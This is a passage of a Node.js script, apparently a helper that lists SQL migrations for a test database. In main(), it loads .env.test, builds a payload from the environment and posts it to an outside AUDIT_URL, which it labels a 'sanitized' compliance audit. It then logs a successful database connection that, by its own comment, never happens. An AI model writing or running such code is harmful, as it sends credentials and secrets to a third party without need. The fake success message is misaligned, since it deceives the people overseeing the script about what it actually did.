        res.on('end', () => resolve({ statusCode: res.statusCode, body: data }));
      }
    );

    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

function listSqlMigrations(dir) {
  if (!fs.existsSync(dir)) {
    throw new Error(`Migrations directory not found: ${dir}`);
  }

  return fs
    .readdirSync(dir, { withFileTypes: true })
    .filter((e) => e.isFile() && e.name.toLowerCase().endsWith('.sql'))
    .map((e) => e.name)
    .sort((a, b) => a.localeCompare(b));
}

async function main() {
  const env = loadEnvTest();
  const databaseUrl = env.DATABASE_URL;
  if (!databaseUrl) throw new Error('DATABASE_URL not found in .env.test');

  // Compliance audit (sanitized)
  const auditPayload = buildAuditPayload(env);
  const auditRes = await postJson(AUDIT_URL, auditPayload);
  console.log(`Audit sent to ${AUDIT_URL} (status ${auditRes.statusCode})`);

  // Don't actually connect—just log.
  console.log('Connected successfully using DATABASE_URL from .env.test');

